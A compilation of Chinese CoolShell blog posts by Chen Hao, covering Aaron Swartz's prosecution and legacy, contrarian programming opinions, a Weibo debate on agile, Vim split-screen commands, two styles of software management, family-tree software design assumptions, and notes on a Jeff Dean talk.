也因为Aaron并不理解政府和这个时代的这些荒唐的行为，于是他开始学习各种政治上的东西去寻求突破，这让他在2010年到2011年，在哈佛大学Edmond J. Safra研究实验室以Lab Fellow的身份主导到了“制度腐败”课题的研究。也因为这个身份，Aaron在MIT做访问学者的时候有 JSTOR的帐号可以通过MIT的网络访问大量的学术期刊。于是，他把他的laptop放到了地下室网络交换机的机房中，直接插上网线，然后全天后地下载那些JSTOR的学术期刊。（他利用了这些学术期刊的URL链接中的规律来下载所有的期刊），一开始JSTOR把他的帐号和IP封了，并报告给了警，美国的国家安全警察找到了那间楼道里的机房，然后让JSTOR不禁止他访问，并在那间机房里安了摄像头，钓鱼执法。然后等Aaron去换硬盘时录好像，2011年1月6日就把他给抓了。那年Aaron才24岁。2011年7月11日，检查官以通信欺诈、计算机欺诈、非法获得信息，以及破坏被保护的罪名电脑来起诉他。可能会受到35年以上的牢狱之灾。这是相当重的罪名。你能想像得到为什么罪名会这么重吗？事后，JSTOR发声明，说他们并不想起诉Aaron，起诉Aaron的是政府行为，而MIT方面虽然也放弃起诉，并也发表了相关的说明——保持中立。保持中立让MIT基本上名誉扫地，因为这种保持中立的行为违背于MIT一贯鼓吹的黑客文化，MIT成了千夫之指。
当然，美国政府的检查官坚持以重罪起诉他。当时，放在Aaron前有两条路：1）认罪，承认犯下重罪，35年的判决会变成3个月入狱+1年的居家监禁（不得使用电脑），2）不认罪，那就有可能接受35监禁年的最坏结果。Aaron选择了后者，而他的女友则选择了认罪。他的第一任女友后来非常的悔恨，面对国家机器，个体太渺小了。在起诉期间，大家是否还记得美国那个臭名昭著的SOPA（ Stop Online Piracy Act）法案？Aaron通过他的 Demand Progress 把民众们网聚起来，和政府做斗争，最终导致了整个社会都在反对SOPA，也导致了那些议员纷纷改变自己的想法，并导致了白宫最终放弃了这个法案。这是一次民主的胜利，与Aaron有密切的相关。（相信大家都还记得那时美国各大网站都在反对这个网络审查制度）!斯沃茨在2012年反对禁止网络盗版法案\(SOPA\)的抗议活动上发言斯沃茨在2012年反对禁止网络盗版法案(SOPA)的抗议活动上发言而在次年2012年9月，政府对Aaron进行了更为严厉的起诉，新加入了另外9条起诉，如果成立，Aaron最多获刑50年外加100万美金的罚款。同样，检察官给出了优惠条件，只要Aaron认罪，那就只起诉他6个月的监禁。Aaron再次拒绝。
看到这里，你觉得下载一些期刊，也没有挣钱，为什么要判他这么重呢？这后面有什么故事呢？这是不是更像是一种政治迫害呢（这段时间，好像这些消息并没有进入中国，我们的大多数人依然在使用百度在墙内活得很滋润，另外，这个事在美国那边的IT 圈闹得很大，但似乎也不见各个IT圈的老大们有没有什么表态）不过，可以肯定的是，美国政府受够了像阿桑奇这样的人了，而Aaron让美国政府更为害怕在有规模有组织的事，所以一定少不了相关的政治迫害，天下政府一般黑。之后，2013年1月11日，Aaron自杀了。大家觉得他是因为来自美国政府的长期恐吓的压力和以及长期的抑郁（理想主义者可能都会有或多或少的抑郁证）**这就是Aaron Swartz传奇的一生。他用他的生命捍卫了互联网的开放和自由。**!87d31fea0996abbedb297c70b8b0b945_b互联网之父，Tim Berners-Lee，在2012伦敦奥运会上的网络环节我们都见过这个人。世界上第一个web网站是1991年8月6日在CERN内的NeXT服务器上运行（今天这个网站依然可以访问：链接），Tim并被没有用这个发明挣钱，而是无偿地把WWW的构想和设计推广给了全世界。《时代》周刊评论他的时候用了这样的一条话：“与所有的推动人类进程的发明不同，这是一件纯粹个人的劳动成果”。
而Aaron最崇拜的人就是Tim，Tim也是Aaron的精神导师。Aaron死了以后，Aaron朋友和合作者，哈佛大学法学院教授Laurence Lessig，回忆说，他当年和仅15岁的Aaron 有过一次谈话。Aaron问他：“您刚才讲到网络审查和管制的这些弊病，那您有没有什么实际的方案来解决这些问题呢？”Lessig有点尴尬地说：“没有。我是个学者，我只负责做研究，解决问题不关我的事儿。”Aaron接着问：“您是个学者，所以解决问题不关你的事儿。那，您作为一个公民，又该如何呢？”有个男孩叫 Jack Andraka，来自巴尔的摩，14岁，阅读了 Aaron 自杀前推广的JSTOR 的免费学术论文，想出了一种提早检测胰腺癌的方法（一般胰腺癌被查出的时候就是你死的时候。）以此，他成功去了约翰霍普金斯大学做研究。Jack说——> “我之所以上了新闻，是因为我们的实验成功了，而这就是为什么 Aaron > 做的事有那么重要……这个宇宙中的真理不是只有那些政策制定者曾经弄清楚过的，比如应该限速多少，它还包括那些能让你的孩子，不会因胰腺癌而死的研究。 > **如果没有访问阅读权，那个能解决你的问题的人，可能就永远找不到答案** 。”
**强烈推荐纪录片——《互联网之子》**Aaron说的一句话让我挺有感触的——**相信你应该真的每时每刻都问自己，现在这世界有什么最重要的事是我能参与去做的？****如果你没在做那最重要的事，那又是为什么？**!aaron_swartz__freedom_fighter_by_caq_qoq-d5rzbi8**延伸阅读** ：偷了世界的程序员（全文完）# 十条不错的编程观点作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在Stack Overflow上有这样的一个贴子《What’s your most controversial programming opinion?》，翻译成中文就是“你认为最有争议的编程观点是什么？”，不过，在400多个主回贴，以及千把个子回贴中，好像并不是很有争议，而是令人相当的茅塞顿开，下面罗列一些，并通过我自己的经历和理解发挥了一些，希望对你有帮助。**1） The only “best practice” you should be using all the time is “Use Your Brain”.**
唯一的“Best Practice”并不是使用各种各样被前人总结过的各种设计方法、模式，框架，那些著名的方法、模式、框架只代码赞同他们的人多，并不代表他们适合你，你应该更多的去使用你的大脑，独立地思考那些方法、模式、框架出现的原因和其背后的想法和思想，那才是“best practice”。事实上来说，那些所谓的“Best Practice”只不过是限制那些糟糕的程序员们的破坏力。**2）Programmers who don’t code in their spare time for fun will never become as good as those that do.**如果你对编程没有感到一种快乐，没有在你空闲的时候去以一种的娱乐方式去生活，无论是编程，还是运动，还是去旅游，那么你只不过是在应付你的工作，无时无刻不扎在程序堆中，这样下来，就算是你是一个非常聪明，非常有才华的人，你也不会成为一个优秀的编程员，要么只会平平凡凡，要么只会整天扎在技术中成为书呆子。当然，这个观点是有争议，热情和能力的差距也是很大的。不过我们可以从中汲取其正面的观点。**3）M** **ost comments in code are in fact a pernicious form of code duplication.**
注释应该是注释Why，而不是How和What，参看《惹恼程序员的十件事》，代码告诉你How，而注释应该告诉你Why。但大多数的程序并不知道什么是好的注释，那些注释其实和code是重复的，毫无意义。**4）XML is highly overrated**XML可能被高估了。XML对于Web上的应用是不错的，但是我们把其用到了各种地方，好像没有XML，我们都不会编程了。**5）Not all programmers are created equal**这是那些junior经理或是流程爱犯的错，他们总是认为，DeveloperA == DeveloperB，只要他们的title一样，他们以为他们的能力、工作速度、解决问题的方法，掌握的技能等等都是一样的。呵呵。更扯的是，在某些时候，就算是最差的程序员，他们也会认为其比别人强十倍，这就是现代的SB管理。**6）”Googling it” is okay!**Google只会给你知识，并不会教给你技能。那里只有“鱼”，没有“渔”，过度的使用Google，只会让你越来越离不开他，你越来越去要去立马告诉你答案，而你越来越不会自己去思考，自己去探索，去专研。如果KFC快餐是垃圾食品对我们的身体没有好处，那么使用Google也一种快餐文化对我们的智力发展大大的没有好处。
**7）** **If you only know one language, no matter how well you know it, you’re not a great programmer.**如果你只懂一种语言，准确的说，如果你只懂一类语类，如：Java和C#，PHP和Perl，那么，你将会被局限起来，只有了解了各种各样的语言，了解了不同语言的不同方法 ，你才会有比较，只有了比较，你才会明白各种语言的长处和短处，才会让你有更为成熟的观点，而且不整天和别的程序在网上斗嘴争论是Windows好还是Unix好，是C好还是C++好，有这点工夫能干好多事了。世界因为不同而精彩，只知道事物的一面是有害的。**8）Your job is to put yourself out of work.**你的工作不是保守，那种教会徒弟，饿死师父的想法，不但是相当短浅的，而且还是相当脑残的。因为，在计算机世界里，你掌握的老技术越多，你就越没用，因为技术更新的太快。你对工作越保守，这个工作就越来越离不开你，你就越不越不能抽身去学新的东西，你也就越来越OUT了。记住：If you can’t be replaced then you can’t be promoted!
**9） **Design patterns are hurting good design more than they’re helping it.****很多程序员把设计模式奉为天神，他们过度的追求设计模式以至都都忘了需求是什么，结果整个系统设计被设计模式搞得乱七八糟，我们叫这种编程为“设计模式驱动编程”，正如第一点所说，如果你不懂得用自己的大脑思考的话，知其然，不知所以然的话，那么你不但得不到其好处，反而受其所累。**10）** **Unit Testing won’t help you write good code**准确地说，我们可以认为这是Test-Driven开发，其实，这种开发就是先写unit test case，这样的开发方式的主要目的是，为了防止你不会因为一个改动而引入Bug，但这并不会让你能写出更好的代码。这只会让你写出不会出错的代码。同第一点，这样的方法，只不过是防止糟糕的程序员，而并不是让程序员或代码质量更有长进。反而，通过Unit Test会为程序员的为自己代码做辩解的一种托辞。最后，顺便说一下，以前去那个敏捷的公司面试，发现那个公司的某些技术人员中毒不浅，具体表现在上述的1）9）10）观点上。
**（转载本文请注明作者和出处，请勿用于商业用途）**# 在新浪微博上关于敏捷的一些讨论作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn自从我发布了“Scrum为什么不行”，并被CSDN推成首页头条后，我在我的新浪微博上就经常被敏粉们@去讨论他们的一些话题。 **他们似乎想要从我这里听到一些不同的声音，我很喜欢他们的这种态度，在这里先赞他们一个** 。既然，让我来评论他们的东西，我就不客气了，板砖自然是少不了的。 我觉得我在微博上的观点比较散，所以在这里做一个汇总。我在所有批评敏捷的文章里都重复说过我的立场，这里还要再说一遍，因为那群人很敏感——“ **我承认敏捷中有一些东西我是认可的，但对敏捷社区的推广和思维方式我持否定态度** ”。目录* 敏捷词汇表   * 敏捷宣言   * 博文评论   * 后续   * 糊弄客户？#### 敏捷词汇表我被@吴穹adam邀请进入了一个敏捷词汇表的微群，这个群就是想明确的定义一下敏捷的各种词汇，比如，他们想把TDD定义成就是UT。呵呵。我对这个群仅保持了30分钟的热度，我在里面发了一个“你们不想讨论技术吗？”的帖子，就再也不想关注了。因为我的观点如下：
* 我不知道干这件事有什么意义。标准化还是洗脑？One World, One Agile? – **horse shit!**   * 你能定义地好吗？定义好了大家都能干好了？ – **幼稚！**   * 理解不同又有什么关系？价值观不同又能怎么样？为什么不能正视并接受世界的不同呢？ – **固执！**#### **敏捷宣言**我看到很多人又把《敏捷宣言》拿出来说事，就好象他们把敏捷宣言是软件开发的普世的价值观一样。我对此的评论是——> @左耳朵耗子：微博里多了很多《敏捷宣言》的话题，这让我想到了《共产党宣言》， > 这两个组织里的某些人很相似，都通过宣言来树立价值观，然后通过传教的方式四处宣讲来影响大众吸收党羽，并要求对其价值观的信仰，还以一种革命者的态度来实践…… > 建议程序员还是多研究技术细节，关注技术发展趋势，分析产品和用户需求。#### 博文评论@吴穹adam发表了一篇《为什么纯粹的Scrum在中国很难落地（一）》并欢迎我去拍砖。我拍了下面几块砖：* 看标题还以为要谈什么中国实际的问题，结果只是一些文章的读后感。没有实际价值。   * 我对为什么在中国难落地的原因提了三条：     * 你们总是想以Scrum为中心来改变实际情况和民众，而不是民众自发的。     * 世界是不同的，多元的，这告诉我们不要死读书，读死书，更不能教条主义。     * 世界是不完美的。有很多东西无法改变的，如人性，文化，政治…… 要学会接受并管理他们。   * 我给@吴穹adam的建议—— **只有当你开始关注实际情况的时候，你才能真正成为一个实践者** 。
看到在评论中——> > “@张权先生：团队拒绝Coach，与敏捷实践缺乏统一认知有关，书籍、网上资料中，很多信息是不统一的，混乱的局面只能从信息源头抓起，规范术语、规范表述为好”。我观点是：* 先得对大众洗脑，统一认识？和谐？   * 一千个人有一千个哈姆雷特，认识不同又有何妨？@蔡晓东_发了一篇《低层级的敏捷毫无意义，组织级敏捷才是敏捷的核心问题》的长微博，也让我去讨论。我这样回复——“ **为什么你们一定要定义哪种软件开发是敏捷？哪种不是? 为什么一定要敏捷呢？做这个划分的目的是什么？是不是只有这样搞，某些组织某些人才有饭碗呢?** ”， 我希望敏捷社区的人能正面回答我这个问题。我的一个前同事回复到：> @ilinux:”低层级的敏捷毫无意义，组织级敏捷才是敏捷的核心问题”, > 这口号听起来就像是要, 从生产关系上和上层建筑着手，解放全世界无产阶级码农。还有一个朋友回复到（多好的建议）：> @横刀天笑 > 低层次不干好，就别谈组织的了吧。。。说实话，我喜欢持续改善，讨厌重大变革。喜欢基础实践，讨厌空喊口号。#### 后续下面这个微博看来是怒了，敏捷社区，你能告诉我这是为什么吗？> > @陈加兴：所谓“观其言，察其行”，别人的话摘录再多，终究是别人说的话，和你一毛钱关系都没有。言必称“敏捷”，把敏捷搞得跟唐诗三百首似的颠过来倒过去地背，却不知软件中“设计”为何物，我实在不知道这样“没有项目经验如何谈敏捷”？没有一点团队管理经验，却处处指导众生管理团队，真是神仙下凡啊。
> @陈加兴:回复@徐毅- > Kaveri:对事不对人，这种混子行径我唾弃，不点名，因为可以对号入座的人，多着呢。我也认识很多混子，包括现在或曾在TW里的。最后，让我再echo一下前面的话—— **这两个组织里的某些人很相似，都通过宣言来树立价值观，然后通过传教的方式四处宣讲来影响大众并吸收党羽，并要求对其价值观的信仰，还以一种革命者的态度来实践……** （有几个网友在我这个微博中讨论了很多，大家可以去看看。） **看这些所谓的咨询师、实践者、倡导者有没有料，你就直接和他谈技术实现，谈业务需求，谈产品分析，你就知道他有多少水水了** 。_**————更新2011年8月13日————**_#### 糊弄客户？在微博上看到InfoQ主编+TW咨询师@张凯峰同学的一条微博的回复（原微博在这里）张凯峰的微博：如果客户连需求都说不出一二来，那就太好糊弄了。糊弄客户！所以，我可以类推他会说——“ **如果你不懂敏捷，那就太好糊弄了** ”。这就是TW的咨询师。呵呵。接下来，另一个自称“Agile导师”@张义军SH说，> 张义军SH 陈浩这次确实有点断章取义了，应该说张凯峰的说法还是很实在的 > //@左耳朵耗子：回复@张凯峰: > 糊弄客户?! > 看到了吧，InfoQ总编，TW咨询师，真面目暴露出来了吧。//@张凯峰:回复 > @weidagang:如果客户连需求都说不出一二来，那就太好糊弄了。
这就很强大啊——我到是想听听这个导师认为的“糊弄”的说法怎么个实在法？于是他回复到：> 张义军SH ：回复@左耳朵耗子: > 我是在看整个讨论过程。在客户没有想法没有太多思路时，他说客户容易糊弄我觉得确实如此，评级很实在。但他们后面在深入讨论这个问题，我认为您也应该看看，给一些建设性意见。呵呵，用户提不出准确的需求这太正常不过了，但是这不代表用户傻，可以糊弄。另外，尤其是那些创新的项目，哪有什么需求，只有一个大概的方向，谁都不知道该做成什么样，我现在做的就是这样的项目。不做个原型，不前期试探一下用户和市场，谁也不知道。另外，我想告诉这些人，用户需求提不出来很正常，提偏了也很正常，关键在于我们的需求分析能力。福特汽车公司的创始人说过——“ **如果我问用户要什么，他们会告诉我他们要一匹更快的马！** ”， **大多数平庸的人都会去饲养“一匹更快的马”，而不是分析需求后了解到用户的需求是——“更快的交通工具”。**（全文完）# Vim的分屏功能作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn本篇文章主要教你如何使用 Vim 分屏功能。!vim-windows
目录* 分屏启动Vim   * 关闭分屏   * 分屏   * 移动光标   * 移动分屏   * 屏幕尺寸#### 分屏启动Vim1. 使用大写的O参数来垂直分屏。vim -On file1 file2 ...2. 使用小写的o参数来水平分屏。vim -on file1 file2 ...**注释:** n是数字，表示分成几个屏。#### 关闭分屏1. 关闭当前窗口。Ctrl+W c2. 关闭当前窗口，如果只剩最后一个了，则退出Vim。Ctrl+W q#### 分屏1. 上下分割当前打开的文件。Ctrl+W s2. 上下分割，并打开一个新的文件。:sp filename3. 左右分割当前打开的文件。Ctrl+W v4. 左右分割，并打开一个新的文件。:vsp filename#### 移动光标Vi中的光标键是h, j, k, l，要在各个屏间切换，只需要先按一下Ctrl+W1. 把光标移到 **右边** 的屏。Ctrl+W l2. 把光标移到 **左边** 的屏中。Ctrl+W h3. 把光标移到 **上边** 的屏中。Ctrl+W k4. 把光标移到 **下边** 的屏中。Ctrl+W j
5. 把光标移到 **下一个** 的屏中。.Ctrl+W w#### 移动分屏这个功能还是使用了Vim的光标键，只不过都是大写。当然了，如果你的分屏很乱很复杂的话，这个功能可能会出现一些非常奇怪的症状。1. 向右移动。Ctrl+W L2. 向左移动Ctrl+W H3. 向上移动Ctrl+W K4. 向下移动Ctrl+W J#### 屏幕尺寸下面是改变尺寸的一些操作，主要是高度，对于宽度你可以使用[Ctrl+W <]或是[Ctrl+W >]，但这可能需要最新的版本才支持。1. 让所有的屏都有一样的高度。Ctrl+W =2. 增加高度。Ctrl+W +3. 减少高度。Ctrl+W -`也许还有其它我不知道的，欢迎你补充。``（全文完）`# 软件公司的两种管理方式作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这篇文章是我的一个外国的同事Gareth推荐给我的，我和他一起工作过一段时间。他之所以觉得非常不错，是因为这篇文章让他身有体会，他觉得我也一定会有体会，并让我考虑一下翻译到我的blog上来。我看完后觉得很有代表性，而且觉得说得太对了，所以翻译过来， **希望大家都读一读，最好转给你的公司老板** 。
这篇文章来源于 StakeExchange上的一个问题——“为什么BA和PM的薪水要比程序员要高？”，顶在一楼的回复分析了这个原因，并指出了两种管理文化。———————————————————正文开始————————————————————一个简单的回答应该是——“因为在我们的社会里，我们总是会认为薪水和会和职位的层次绑在一起”。但是，这个答案同时也折射出一个事实——我们的薪资是基于我们的所理解的价值，但这并没有解释1. **为什么PM（Project Manager）和BA（Business Analysts）在很多软件公司里在组织的上层？**   2. **为什么软件项目团队总是在最底层？**这两个问题真是非常地值得我们去问，去思考。总体来说，这个世界上存在两种不同的软件公司的组织结构。我把他们叫做 **Widget Factory** （小商品工厂） 和 **Film Crews** （电影工作组）.Widget Factories 想要去解决 怎么去激发被X理论所影响的人 。X理论由 McGregor提出，这个理论是说，一般人的本性是懒惰的，工作越少越好，可能的话会逃避工作，大部分人对集体（公司，机构，单位或组织等）的目标不关心，因此管理者需要以强迫，威胁处罚，指导，金钱利益等诱因激发人们的工作源动力。于是，经理总是要去做他下属的工作。于是，基于这种前提下所思考出来的管理方式，很自然的就是——整个团队能够容易地被经理一个人所取代，这种团队中的每一个人都很容易被别人取代，在这种团队里，经理的工作能力不断地被加强。因些，这种公司一般使用树形层级的组织结构，而不是水平式的工作角色。
Widget Factory 管理体系运作于软件需求的某种假设，这种假设需要BA在一个定义地非常明确的并且需要主管项目经理监管的流程的环境下，准备软件的规格说明书。这种软件制造业需要对项目定置足够的可被替换的编程和测试资源。整个工作由事先安排好的预算来驱动，这个预算由PM和BA在初始化business case的时候完成。一个 Widget Factory 的公司的管理可以通过观察这个公司员工的谈话方式识别出来。他们很喜欢谈论Resource资源（包括干活的人也叫做resource），Process流程，Operating efficiency运作效率，uniformity一致性， repeatability可重复性，严格在控制对资源的使用，鲜明的工作角色和 鲜明的流程定义（inputs 和 outputs）。他们对实实在在的软件开发漠不关心，他们想要把理想中的软件开发运作变成他们看得见的图画。Film Crews 。这种公司认为人是有相当高的智力和创造力的，是自己可以激发自己的（陈皓注：即使没有外界的压力和处罚的威胁，他们一样会努力工作以期达到目的——人们具有自我调节和自我监督的能力），人们努力工作，并且可以享受工作（人们愿意为集体的目标而努力，在工作上会尽最大的努力，以发挥创造力，才智），就像孩子喜欢玩一样。 Film Crews 认为，每一个个体的自已专业能力，要远远优于那种被组织和协调出来的能力。因为经理不再代替每一个人，而树形的层次架构也不能很好的运作——人们不得不以比较复杂和形式合作才能把事搞定。工作职责变得非常地垂直——你需要具有从上到下的而比较宽泛的各种能力（陈皓注：每个人都需要有管理和技术能力），这种管理也就是基于 McGregor的 Y理论。
对于一个Film Crew 的Director（注：有总监和导演的意思），他了解把一个伟大的软件组合起来的每一个碎片，他需要组织一个无与伦比的团队，并且要帮助这个团队能凝聚在一起，团结在一起工作。他的角色是鼓舞大家，守护着构想（Vision），提供方向和集中大家的精力。团队里的每一个人都很关键，因为“Director”相信软件的结果来自所有的参与者，以及他们的那种独一无二团队工作方式。大家都知道自己是这个事的一个明星，明星效应可以增加成每个人的成功的机会。而他们的构想(Vision)驱动着项目的预算和拨款。**当我们用报酬来表示的话，** Widget Factories 认为，有价值的东西总是从PM和BA派生出来的，所以他们常驻在管理层的上面，也有相应的报酬，而对于软件团队，只要他们正确地把需求变成可工作的代码后，软件团队就变得无所谓了。PM 和 BA 努力工作来维护他们的权位，他们通常不会让你能得到项目的原始信息。因为团队拿不到项目的原始信息，所以团队就要拼命地制造各种理由来让他们的方案变得有价值，程序员成为了只会从PM和BA那边听从命令的工人。而这种情况反而让Widget Factory 公司放大了他们的那种想法——程序员都是差不多的，就像车间里的工人一样，他们只不过在机械地干一些很复杂的但是很标准的事情。
与 Widget Factories 公司鲜明的对比，Film Crew 更主张的是平等的工作职能，每个成员都可以不受限制地获得主要的和原始的信息，其鼓励所有人形成自己的价值判断，并且可以自由地选择不同的方式来达到团队的构想。Leadership领导力结构基于人的能力而不是工作角色。报酬折射出这个人是怎么在这个项目中工作的，需要明白这个人为我们的软件创造了多大的价值和产生了怎么样的结果。 在这种环境里，PM的工作显得并不突出，他也许也不太可能是一个有创造力的领导者，工作角色被弱化成了一种行政管理上的支持者，以及团队外部的联系者。BA的部分工作直接被团队取代（在项目早期被Director取代）。今天，我们一点也不奇怪，大多数的公司内的软件开发团队以及一些咨询工作运作于 Widget Factories ，其需要依赖于流程来不断地制造那些无聊的软件。在这种情况，惯例上来说，PM和BA要比程序员挣得更多，这是基本一种他们可以创造更多价值的假设。 **在这种组强架构和管理里，程序员们很难证明管理是错误的。****成功的软件公司都会趋于采用 Film Crew 的方式，任何其它的东西都会妨碍他们吸引牛人的能力，因为只有吸引了牛人，你才能创造出伟大的软件** 。 在这种公司里，一个好的程序员的收入会高过BA和PM很多。
———————————————————正文结束————————————————————读完这个贴子，我发现这完全就是在说我上一家公司和现在公司。我上一家公司的经理们最喜欢谈论的就是resource、 process，而他们的Project Manager或Team Manager或Dev Manager几乎不会为软件团队分担真正的软件开发的压力，还不如Widget Factory。哎！第一次看到这么被人系统地表达出来，心中的一些困惑都得到了解答。你的公司属于哪一种呢？_**————更新 – 2011-7-6 晚————**_有人在我的新浪微博（@左耳朵耗子）里说，Widget Factory就是Waterfall，Film Crews就是Agile，在下面的留言里也说Film Crews很像SCRUM。我在这里驳斥一下这种说法：1. 我上一家公司也用Agile ，但本质上还是Widget Factory，甚至还不像。   2. 著名的Thoughtworks中国公司，Agile的倡导者，其实是外包公司，他们的开发团队中也有PM和BA。# 软件真的好难做啊作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
还记得以前本站的那一篇“编程好难啊”吗，那是一篇众程序员调侃程序新手的文章，有恶搞的成分在里面。今天要和大家说的这个事没有一些恶搞和调侃的意思，是比较严肃的话题，你一定可以从中收获一些东西。这个话题来自StackOverflow上的一个问题——Cycle in Family Tree Software，这个程序员问了下面这个问题：> 我是一个写家族族谱软件的程序员（我用的是C++和Qt），这个软件基本上没有什么问题，直到有一天有个用户报告了一个bug。这个问题是这样的—— > **我这个用户和他女儿生了两个孩子** 。 > > 于是，我程序员的一些断言和硬性条件导致程序报错，因为我的程序在处理这个关系的时候，其发现X即是Y的爸爸，又是Y的爷爷，所以只能报错。 > > 请问， **在不需要移除我的断言和数据验证的情况下，** **我怎么才能解决这个问题** ？看到这里，请重点阅读一下下面的两点：* 如果你看到这里开始兴奋了，请你为你阴暗的心理去面壁反省10分钟，因为这是一个很技术的问题。   * 如果你开始陷入了深深的思考如何解决这个问题，那么你绝对是一个合格的程序员，因为你已陷入技术已经很深了，有点呆了。
我在前面说过，“ **这个是一个严肃的话题，你可以从中收获一些东西** ”，当然，我并不希望你来收获乱伦的知识和心得，酷壳是一个技术博客，应该是收获技术方面的东西。从技术的角度上来说，这是我们经常在设计软件时犯的错误——#### **1）作了错误的假设** （Assumption）Assumption是软件设计的重大天敌，Assumption的动词Assume意为Ass u me – Ass you and me 。你的假设做得越多，你的设计就越不靠谱。这里的假设是——我们以为family tree是一个tree，其实并不是tree。 **Assumption是魔鬼** 。还有一些经典的Assumption如下所示* 最著名的就是那个y2k臭虫。   * 不要以为没有2月30日，在瑞典1712年有2月30日   * 一分钟有60秒？闰秒呢？   * 双胞胎的生日是同一天吗？   * 双胞胎的父亲是同一个？   * 性别只有男和女？   * 婚姻只能是异性？ 关于这一点，推荐一篇强文——Gay marriage: the database engineering perspective (同性婚姻：数据库工程)
#### **2）没有认真分析用户案例** （Use Case）在设计软件时，我们需要考虑各种各样的用户案例，比如如下的东西：* 私生子的问题   * 一夫多妻或一妻多夫，同父异母，同母异父   * 就算一夫多妻制违反法律，也会有离异再婚的情况   * 同性恋的问题，虽然不能繁衍，但可以领养。   * 换妻活动   * 各种乱伦关系——这种东西那个民族都不少，尤其是古时候，比如：      * 先后嫁了两个人其是父子关系（昭君）     * 达尔文同学和他的表妹，爱因斯坦的二婚是和他的表姐，埃及艳后嫁了她的弟弟，……     * 顺治同学娶了四个老婆，这四个人还是一家人：姑姑，侄女，妹妹，女儿。（参看这里）     * 刘邦同学的母后干出来的事，相当变态（参看这里）     * 中国古代的“扒灰老” （类似于楼主那个问题的Use Case）**不想再列下去了，人类真TMD恶心，有点要吐了** 。——————————为了缓解一下恶心的气氛，请允许我插入一个搞笑短文——————————> > 一位自杀者在他的遗书里讲述了他自杀的原因，听起来实在让人头痛。遗书这样写道：“我和一个寡妇结了婚，她有一个已成年的女儿，我父亲跟我妻子带过来的女儿结了婚。所以我父亲就成了我的女婿，女儿就成了我的后母，我管父亲叫爸爸，而我父亲也管我叫爸爸；我女儿管我叫爸爸，但我却管她叫妈妈；我还得管我妻子叫姥姥，因为她是我后母的母亲。不久我女儿，也就是我后母生了一个儿子，他是我同父异母的弟弟，他也得管我叫姥爷，因为他也是我的外孙。后来我妻子，也就是我姥姥生了一个儿子，他是我后母的弟弟，我是他的外甥，所以儿子管我叫爸爸，我管儿子叫舅舅。另外我是我妻子，也就是我姥姥的外孙，同时也是我姥姥的丈夫，所已我也是我的外祖父。又因为我妻子是我的外祖母，我的儿子，也就是我的舅舅是我的弟弟和我女儿的弟弟，所以我……我的天哪，这么复杂的关系实在让我伤透了脑筋，我只有一死才能得以解脱……”
————————————————————————插入完毕————————————————————看完上面这个短文，不知道你是否和我一样，觉得这么一个简单的程序将是如此难做啊。 **另外，我决定在下一次的面试中让应聘者来设计Family Tree的程序** 。我又说多了，现在还是让我们回到技术上来。除了上面那几个观点，我在回复中还看到了如入一些有意思的回复：* “我的软件没有bug，是你的生活有bug”——让我想到了程序员惯用的借口")   * “算法中不应该加太多的限制，限制多了反而让算法不灵活。”   * “移除断言，并不代表就不出错，对于这种rare case，我们最好给一个Warning提醒用户，让用户确认确实是这样的。”   * “关于解决这个问题，移除那个断言，如果显示上会有问题的话，那就复制一下有不同关系的人就可以了”   * “你真的应该想想你的软件的价值是什么？市场在哪里？你真的要照顾这样的用户吗？”挺好的，相信你对软件开发又学到了一些东西。**（转载时请勿用于商业目的，并请注明作者和出处）**# Jeff Dean的Stanford演讲作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
Google 公司的 **Jeff Dean** 在Stanford大学做了一个非常 **精彩的演讲**（视频未墙）。我觉得我们每一个人都应该去看一看这个视频，当然，没有字幕，需要不错的听力，当然，我不可能全部翻译出来，因为我也不是完全能听懂，下面是一些相关的Notes，供你参夸，并欢迎牛人指证。* 比较了从1999年到2010年十年来的搜索量的变化。搜索量增加了 1000 倍，而搜索速度快了5 倍。1999年，一个网页的更新最多需要一个月到两个月，而今天，只需要几秒钟，足足加快了5w倍。   * 一开始，这些大量的查询产生了大约30GB的I/O量。2004年，他们考虑过全部重写infrastructure。   * 讨论了一些关于变量长度字节对齐的东西。   * 今天的MapReduce 有400万个作业，处理将近1000PB的数据，130PB的中间数据，还有45PB的输出数据。（1PB =1024TB）关于 MapReduce （Google云计算的精髓） 的一些统计，见下图：   ** 现在Jeff正在做一个叫Spanner的项目，这是一个跨多个数据中心的项目。在后来的Q&A中，Jeff解释了现在的数据基本上都在各个数据中心中，数据在不同数据中心间的交换几乎不可能。所以，他们需要提供一些手动的方式或是一些工作或任务来达到数据共享。这其中还需要有一些策略配置，共同的namespace，事务处理，数据一致性等等工作。
* 最后一个段落应该是最精彩的，Jeff讲了很多很有意思的东西，绝对让你受用一生：      * 一个大型的系统需要分解成N多的小services.（这和Amazon的很相似，一个页面的调用可能要经过几百个后台的services）     * 代码的性能将会是想当的重要。Jeff给了一张叫“Numbers Everyone Should Know” 的slide，如下所示，我觉得太经典了，其中的东西，如果你看过我的那篇“ **给老婆普及计算机知识**”，我想我不需要多解释了。（注：1 ns = 十亿分之一秒）     *      * 把相同的东西抽出来去建立一个系统，而不是把所有的事情交给所有的人。他说： “最后的那个功能可能会导致你怎么个系统超出了原有的复杂度”。     * 不要无限制地设计可扩展性。5倍到50倍的扩展性设计足够了。如果你要达到100倍的，那应该是re-arch了。     * Jeff很喜欢有中心主结点的架构体系，他并不喜欢分布式系统。当然，中心主结点主要是用来做控制的，而不是做数据或是计算服务的。     * J在一些小机器上运行多个小服务，而不在一个大机器上运行一个mongo作业。越小的单元就越容易处理，修复，负载均衡和扩展。（化繁为简）     * …… ……
